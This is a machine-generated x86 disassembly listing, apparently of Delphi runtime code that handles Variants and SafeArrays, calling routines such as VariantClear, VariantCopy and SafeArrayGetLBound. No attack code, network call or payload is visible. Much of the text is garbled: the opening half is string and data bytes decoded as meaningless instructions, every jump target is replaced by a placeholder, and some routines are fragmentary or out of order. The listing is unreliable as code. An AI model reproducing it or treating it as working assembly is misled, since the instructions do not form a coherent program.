inc eax
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edi ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jecxz r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xe2
inc eax
outsd
jb r-xdata
inc eax
add [ eax + 0x15004031 ] al
inc ebp
push esi
popad
jb r-xdata
and dl 0x40
add [ eax ] al
add [ eax ] al
inc ebx
popad
jb r-xdata
mov eax 0x40e1
add [ eax ] al
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe4
outsd
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0040 ] ch
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ 0x72615645 ] dl
outsd
jb r-xdata
add [ eax ] al
pop eax
js r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jecxz r-xdata
xor eax [ eax ]
loopne r-xdata
call 0xffffffffec412368
inc ebp
push esi
popad
jb r-xdata
xor [ eax ] eax
pop ss
loop r-xdata
shr [ ebx + 0x40 ] 0x0
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
rol [ eax + 0x40e2 ] 0x0
add [ eax ] al
add [ eax ] al
jbe r-xdata
popad
outsb
je r-xdata
jb r-xdata
popad
outsb
je r-xdata
add ah ah
xor eax [ eax ]
call 0xffffffffec41249c
jb r-xdata
add ah ah
xor eax [ eax ]
call 0xffffffffec412434
jb r-xdata
add [ eax ] al
xor eax [ eax ]
loopne r-xdata
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
popad
jns r-xdata
xor eax [ eax ]
loopne r-xdata
call 0xffffffffec4123cc
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] dl
inc eax
inc eax
add [ esp ] dl
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x17004031 ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edi ] dl
jbe r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + 0x78 ] bl
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0040e1
add [ eax ] al
lea eax [ eax ]
push esp
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x69726156 ] dl
inc eax
add al ah
in al 0x40
add [ eax ] al
add [ eax ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
inc eax
jb r-xdata
popad
add [ eax ] al
xor eax [ eax ]
loopne r-xdata
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0x16004031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] dl
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x18004031 ] al
outsd
inc eax
add ah ch
jb r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
outsb
je r-xdata
popad
outsb
je r-xdata
insd
jo r-xdata
popad
je r-xdata
inc eax
add [ esp + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] ch
add [ eax ] al
pop eax
js r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edi ] dl
add [ eax + 0x15004031 ] al
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
inc ebp
push esi
popad
jb r-xdata
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x17004031 ] al
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
jbe r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
out 0x40 al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
jae r-xdata
popad
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
lodsb [ esi ]
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax - 0x1b ] cl
inc eax
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
inc eax
retn
popad
outsb
je r-xdata
je r-xdata
outsd
jb r-xdata
popad
pop ebp
xor eax [ eax ]
loopne r-xdata
inc eax
add ah ch
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
or cl ah
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc dh ah
inc eax
outsd
jb r-xdata
inc ebp
jb r-xdata
jb r-xdata
movntq [ eax ] mmx0
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e67d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
outsb
dec esi
jne r-xdata
push 0x6f727245
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
rcl [ ebp + 0x68 ] 0x76
out 0x40 al
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dfc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dfc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e716
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f44
retn
call 0xffffffff8c25341d
mov ebx eax
xor eax eax
push ebp
push sub_40e70f
insb
dec edi
jo r-xdata
rcl [ eax ] 0xe6
add [ ebp - 0x541703bb ] cl
pop eax
jb r-xdata
sub_40e62c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e676
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e67d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40e680
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e70f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dfc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dfc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e716
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f44
retn
sub_40e71c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e766
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e76d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40e770
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7c1
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40e7c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e853
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dfc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dfc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e85a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f44
retn
sub_40e860
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e8aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8b1
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40e8b4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40eaf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb00
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f44
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
dec eax
je r-xdata
call sub_40e62c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
jmp r-xdata
call sub_40e71c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b05c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
jmp r-xdata
sub_40eb14
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e680
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e7c4
jmp r-xdata
jmp r-xdata
call sub_40e8b4
sub_40eb48
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40276c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40eb14
pop esi
pop ebx
retn
call sub_40276c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40eb14
jmp r-xdata
call sub_4027ac
mov edx eax
mov eax edx
call sub_40395c
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40eb14
jmp r-xdata
pop esi
pop ebx
retn
sub_40ebcc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ec16
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec1d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40ec34
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ec64
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ec64
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ecc0
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40eb08
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40eb08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ec34
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40eb08
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40eb08
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ec64
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40eb08
mov eax [ ebp - 0x314 ]
call sub_40eeb8
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ee3c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40eb08
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f20
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4143cc
test al al
je r-xdata
mov eax ebx
call sub_40ecc0
jmp r-xdata
push ebx
call VariantClear
call sub_40eb08
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40eed4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ef04
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ef04
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ef60
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40eb08
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40eb08
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40eeb8
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e860
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40eb08
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40eb08
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eed4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ef04
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40eb08
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40eb08
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f134
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ee3c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40eb08
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f74
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4143cc
test al al
je r-xdata
mov ecx sub_40f12c
mov edx esi
mov eax ebx
call sub_40ef60
jmp r-xdata
